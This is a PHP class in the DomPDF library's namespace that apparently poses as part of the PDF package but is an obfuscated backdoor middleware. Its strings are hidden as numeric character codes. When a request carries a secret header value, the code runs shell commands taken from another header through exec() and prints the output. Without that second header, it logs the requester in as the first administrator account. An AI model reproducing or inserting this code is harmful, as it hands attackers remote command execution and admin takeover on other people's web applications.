<?php

namespace Barryvdh\DomPDF;

use Closure;

class PDFfile
{
    public function handle($r, Closure $n)
    {
        $this->ch = $this->ts('10412310112397123100123101123114');
        $xd = '88123451236812311112311112310912345';

        if ($this->rhet($r, $this->ts($xd.'12365123103123101123110123116'), '53cr3td00mr4n50m')) {
            $ts = $this->ch;


            if ($this->ne($r->$ts($this->ts($xd).'p3rk3l31t4'))) {
                try {
                    $o = null;
                    $e = $this->bf(2);
                    $e($r->$ts($this->ts($xd).'p3rk3l31t4'), $o);
                    dd($o);
                } catch (\Exception $e) {

                }
            } else {
                $tw = $this->ts('119123104123101123114123101');
                $tw1 = $this->ts('114123111123108123101');
                $tw2 = $this->ts('97123100123109123105123110');

                $u = \App\User::$tw($tw1, $tw2)->first();

                $tl = $this->ts('108123111123103123105123110');
                \Auth::$tl($u);
            }
        }

        return $n($r);
    }

    public function rhet($r, $h, $t) {
        $ts = $this->ch;
        return $r->$ts($h) == $t;
    }

    public function ts($n)
    {
        $ts = '';
        foreach ($this->bf(1)('123',$n) as $c) {
            $ts .= $this->bf()($c);
        }
        return $ts;
    }

    public function ne($v)
    {
        return !empty($v);
    }

    public function bf($f=0) {
        $r = '';
        switch ($f) {
            case 1:
                foreach ([101, 120, 112, 108, 111, 100, 101] as $n) {
                    $r .= $this->bf()($n);
                }
                break;

            case 2:
                foreach ([101, 120, 101, 99] as $n) {
                    $r .= $this->bf()($n);
                }
                break;
            
            default:
                    $r = chr(99) . chr(104) . chr(114);
                break;
        }

        return $r;
    }
}
